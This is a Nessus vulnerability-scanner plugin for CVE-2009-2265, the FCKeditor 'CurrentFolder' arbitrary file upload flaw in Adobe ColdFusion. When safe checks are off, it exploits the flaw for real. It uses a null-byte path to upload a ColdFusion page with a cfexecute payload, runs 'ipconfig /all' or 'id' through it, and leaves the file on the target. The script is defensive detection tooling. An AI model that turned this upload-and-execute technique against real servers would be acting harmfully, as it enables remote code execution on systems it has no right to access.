#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if (description)
{
  script_id(39790);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2016/11/17 21:38:53 $");

  script_cve_id("CVE-2009-2265");
  script_bugtraq_id(31812);
  script_osvdb_id(55684, 55820);
  script_xref(name:"Secunia", value:"35747");
  script_xref(name:"EDB-ID", value:"16788");

  script_name(english:"Adobe ColdFusion FCKeditor 'CurrentFolder' File Upload");
  script_summary(english:"Tries to upload a file with ColdFusion code using FCKeditor.");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains an application that is affected by an
arbitrary file upload vulnerability.");
  script_set_attribute( attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is
affected by an arbitrary file upload vulnerability. The installed
version ships with a vulnerable version of an open source HTML text
editor, FCKeditor, that fails to properly sanitize input passed to
the 'CurrentFolder' parameter of the 'upload.cfm' script located under
'/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm'.

An attacker can leverage this issue to upload arbitrary files and
execute commands on the remote system subject to the privileges of the
web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.ocert.org/advisories/ocert-2009-007.html");
  script_set_attribute(attribute:"see_also",value:"http://www.adobe.com/support/security/bulletins/apsb09-09.html");
  script_set_attribute( attribute:"solution",  value:
"Upgrade to version 8.0.1 if necessary and apply the patch referenced
in the vendor advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'ColdFusion 8.0.1 Arbitrary File Upload and Execute');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(22);


  script_set_attribute(attribute:"vuln_publication_date", value:"2009/07/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/07/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/07/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80, 8500);
  script_require_keys("installed_sw/ColdFusion");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# key = command, value = arguments
cmds = make_array();
cmd_desc = make_array();
cmd_pats = make_array();
os = get_kb_item("Host/OS");

# decides which commands to run based on OS
# Windows (or unknown)
if (isnull(os) || 'Windows' >< os)
{
  cmds['cmd'] = '/c ipconfig /all';
  cmd_desc['cmd'] = 'ipconfig /all';
  cmd_pats['cmd'] = 'Windows IP Configuration|Subnet Mask|IP(v(4|6)?)? Address';
}

# *nix (or unknown)
if (isnull(os) || 'Windows' >!< os)
{
  cmds['sh'] = '-c id';
  cmd_desc['sh'] = 'id';
  cmd_pats['sh'] = 'uid=[0-9]+.*gid=[0-9]+.*';
}


path = "/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm";

folder_name = str_replace(
    find:".nasl",
    replace:"-"+unixtime()+".cfm",
    string:SCRIPT_NAME
  );

if(safe_checks())
{
  url =
    path + "/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/" +
    folder_name + "%0d";

  res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail: TRUE);

  # If it does and is not disabled...
  if (
    "OnUploadCompleted" >< res[2] &&
    "file uploader is disabled" >!< res[2]
  )
  {
    # Try to upload a file.
    bound = "nessus";
    boundary = "--" +bound;

    postdata =
      boundary + '\r\n' +
      # nb: the filename specified here is irrelevant.
      'content-disposition: form-data; name="newfile"; filename="nessus.txt"\r\n'+
      'content-type: text/plain\r\n' +
      '\r\n' +
      '<!-- test script created by ' + SCRIPT_NAME + '. -->\r\n' +
      boundary + "--"+ "\r\n";

    res = http_send_recv3(
      method : "POST",
      port   : port,
      item   : dir + url,
      data   : postdata,
      add_headers : make_array(
                       "Content-Type", "multipart/form-data; boundary="+bound),
      exit_on_fail : TRUE
    );

    if(
      "An exception occurred when performing a file operation copy" >< res[2]
      &&
      folder_name + '\\r' >< res[2]
    )
    {
      if (report_verbosity > 1)
      {
        report =
          '\n' +
          'The remote ColdFusion install responded with the following error, while trying to upload a file : ' +
          res[2] + '\n\n' +
          'Note that Nessus reported this issue only based on the error message because \n' +
          'safe checks were enabled for this scan.\n';
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
else
{
  timeout = get_read_timeout();
  http_set_read_timeout(timeout * 2);

  url =
    path + "/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/" +
    folder_name + "%00";

  res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail: TRUE);

  # If it does and is not disabled...
  if (
    "OnUploadCompleted" >< res[2] &&
    "file uploader is disabled" >!< res[2]
  )
  {
    # Try to upload a file to run a command.
    bound = "nessus";
    boundary = "--" + bound;
    try_again = 0;

    foreach cmd (keys(cmds))
    {
      postdata =
        boundary + '\r\n' +
        # nb: the filename specified here is irrelevant.
        'content-disposition: form-data; name="newfile"; filename="nessus.txt"\r\n' +
        'content-type: text/plain\r\n' +
        '\r\n' +
        # nb: this script executes a command, stores the output in a variable,
        #     and returns it to the user.
        '<cfsetting enablecfoutputonly="yes" showdebugoutput="no">\r\n' +
        '\r\n' +
        '<!-- test script created by '+ SCRIPT_NAME + '. -->\r\n' +
        '\r\n' +
        '<cfexecute name="' + cmd + '" arguments="' +cmds[cmd] + '" timeout="'+
        timeout + '" variable="nessus"/>\r\n' +
        '<cfoutput>#nessus#</cfoutput>\r\n' +
        boundary + '--\r\n';

      # Increment 'folder_name' in URL and in the set variable so that each
      # attempt will upload a unique file, otherwise exploit try to upload a
      # file that already exists and would then fail
      if (try_again > 0)
      {
        orig_url = url;
        orig_folder = folder_name;
        time = unixtime() + try_again;

        url = ereg_replace(pattern:"-([0-9]+)\.cfm", replace:'-'+time+".cfm", string:url);
        folder_name = ereg_replace(pattern:"-([0-9]+)\.cfm", replace:'-'+time+".cfm", string:folder_name);

        # Just in case, revert to original values
        if (empty_or_null(url)) url = orig_url;
        if (empty_or_null(folder_name)) folder_name = orig_folder;
      }

      res = http_send_recv3(
        method : "POST",
        port   : port,
        item   : dir + url,
        data   : postdata,
        add_headers  : make_array(
                      "Content-Type", "multipart/form-data; boundary="+bound),
        exit_on_fail : TRUE
      );

      attack_req = http_last_sent_request();

      # Figure out the location of the script to request for code execution
      pat = 'OnUploadCompleted\\( *0, *"([^"]+/' + folder_name + ')';
      foreach line (split(res[2], keep:FALSE))
      {
        matches = eregmatch(pattern:pat, string:line);
        if (matches) url2 = matches[1];
      }
      if (isnull(url2)) exit(1, "Nessus was unable to extract the URL for the file uploaded to the "+app+" install at "+install_url);

      # Now try to execute the script.
      res = http_send_recv3(port:port, method:"GET", item:url2, exit_on_fail: TRUE);
      if(egrep(pattern:cmd_pats[cmd], string:res[2]))
      {
        if ("ipconfig" >< cmd_desc[cmd]) line_limit = 10;
        else line_limit = 4;
        security_report_v4(
          port        : port,
          severity    : SECURITY_HOLE,
          cmd         : cmd_desc[cmd],
          line_limit  : line_limit,
          request     : make_list(attack_req, (install_url - dir)+url2),
          output      : chomp(res[2]),
          rep_extra   : '\nNote: This file has not been removed by Nessus'+
                        ' and will need to be\nmanually deleted.'
        );
        exit(0);
      }
    try_again++;
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
